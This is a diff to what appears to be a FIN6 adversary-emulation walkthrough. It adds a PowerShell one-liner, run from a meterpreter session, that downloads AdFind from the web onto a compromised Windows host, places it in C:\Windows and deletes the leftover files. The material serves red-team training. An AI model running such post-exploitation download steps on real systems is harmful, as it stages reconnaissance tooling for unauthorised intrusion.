@@ -139,7 +139,7 @@ After gaining access to the target network, FIN6 enumerates the network and Acti
 
 FIN6 is believed to have used ADFind for this purpose on at least one occasion. 
 
-[**AdFind**](https://www.joeware.net/freetools/tools/adfind/) is a command line Active Directory query tool. Mixture of ldapsearch, search.vbs, ldp, dsquery, and dsget tools with a ton of other cool features thrown in for good measure. This tool proceeded dsquery/dsget/etc by years though I did adopt some of the useful stuff from those tools.
+[**AdFind**](https://www.joeware.net/freetools/tools/adfind/) is a free command-line query tool that can be used for gathering information from Active Directory.
 
 On the `meterpreter` terminal, we will use PowerShell session instead to download AdFind on Windows directory. To enable PowerShell session, run the following commands:
 
@@ -149,6 +149,14 @@ Loading extension powershell...Success.
 meterpreter > powershell_shell
 PS > 
 ```
+
+Afterwards, execute the following command to start the installation process of AdFind on the target machine:
+
+```bash
+$postParams = @{B1='Download+Now';download="AdFind.zip";email=''};
+Invoke-WebRequest -Uri http://www.joeware.net/downloads/dl2.php -Method POST -Body $postParams -OutFile C:\Users\Public\adfind.zip; Expand-Archive -Path C:\Users\Public\adfind.zip -DestinationPath C:\Users\Public -Force; Move-Item -Path C:\Users\Public\AdFind.exe -Destination C:\Windows\AdFind.exe -Force; Remove-Item -Path C:\Users\Public\adfind.zip -Force; Remove-Item -Path C:\Users\Public\adcsv.pl -Force;
+```
+
 
 ## Step 3 - Privilege Escalation
 
